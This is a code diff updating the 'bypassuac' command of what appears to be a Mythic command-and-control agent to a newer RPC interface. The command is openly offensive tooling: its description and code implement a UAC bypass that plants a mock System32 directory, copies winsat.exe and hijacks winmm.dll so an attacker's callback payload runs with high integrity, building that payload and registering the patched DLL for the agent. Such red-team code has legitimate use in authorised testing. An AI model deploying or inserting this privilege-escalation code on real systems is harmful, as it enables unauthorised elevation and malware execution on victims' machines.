@@ -1,9 +1,9 @@
-from CommandBase import *
+from mythic_payloadtype_container.MythicCommandBase import *
 import json
 from os import path
 from uuid import uuid4
-from MythicFileRPC import *
-from MythicPayloadRPC import *
+from mythic_payloadtype_container.MythicRPC import *
+import base64
 
 
 class BypassuacArguments(TaskArguments):
@@ -31,7 +31,7 @@ class BypassuacCommand(CommandBase):
     needs_admin = False
     help_cmd = "bypassuac (modal popup)"
     description = """Bypasses a UAC prompt using "mock" trusted directories. Creates the directory "C:\Windows \System32\" (note the space after Windows) and copies winsat.exe to the folder. When winsat.exe starts from the mock System32 directory, it auto-elevates to high integrity and attempts to load the file winmm.dll. The command writes the a payload to disk (the "targetPath" parameter) and hijacks winmm.dll causing it to start the payload using "cmd.exe /c <targetPath> <targetArgs>"""
-    version = 3
+    version = 4
     is_exit = False
     is_file_browse = False
     is_process_list = False
@@ -66,19 +66,21 @@ class BypassuacCommand(CommandBase):
             'utf-8') + (b"\x00"*(executableArgsLen-len(executableArgs)))
         bypassDllBytes = bypassDllBytes.replace(
             b'B'*executableArgsLen, executableArgsReplacementBytes)
-        
-        gen_resp = await MythicPayloadRPC(task).build_payload_from_template(task.args.get_arg('payload'),
-                                                                            description=task.operator + "'s callback from bypassuac task " + str(task.task_id))
+
+        gen_resp = await MythicRPC().execute("create_payload_from_uuid",
+                                             task_id=task.id,
+                                             payload_uuid=task.args.get_arg('payload'),
+                                             new_description="{}'s callback from bypassuac task {}".format(task.operator, str(task.id)))
         if gen_resp.status == MythicStatus.Success:
             # we know a payload is building, now we want it
             while True:
-                resp = await MythicPayloadRPC(task).get_payload_by_uuid(gen_resp.uuid)
+                resp = await MythicRPC().execute("get_payload", payload_uuid=gen_resp.response["uuid"])
                 if resp.status == MythicStatus.Success:
                     if resp.build_phase == 'success':
                         if len(resp.contents) > 1 and resp.contents[:2] != b"\x4d\x5a":
                             raise Exception("bypassuac requires a payload an executable, but got unknown format.")
                         # it's done, so we can register a file for it
-                        task.args.add_arg("payload", resp.agent_file_id)
+                        task.args.add_arg("payload", resp.response["file"]["agent_file_id"])
                         break
                     elif resp.build_phase == 'error':
                         raise Exception("Failed to build new payload: " + resp.error_message)
@@ -94,11 +96,17 @@ class BypassuacCommand(CommandBase):
         task.args.add_arg("targetPath", targetPath)
 
         task.args.remove_arg("targetArgs")
-        resp = await MythicFileRPC(task).register_file(bypassDllBytes)
+        resp = await MythicRPC().execute("create_file",
+                                         file=base64.b64encode(bypassDllBytes).decode(),
+                                         task_id=task.id,
+                                         delete_after_fetch=True)
         if resp.status == MythicStatus.Success:
-            task.args.add_arg("bypassDll", resp.agent_file_id)
+            task.args.add_arg("bypassDll", resp.response['agent_file_id'])
         else:
             raise Exception(f"Failed to register bypass DLL: {resp.error_message}")
+        
+        task.display_params = "Attempting to run elevated: {} {}".format(executablePath, executableArgs)
+        
         return task
 
     async def process_response(self, response: AgentResponse):
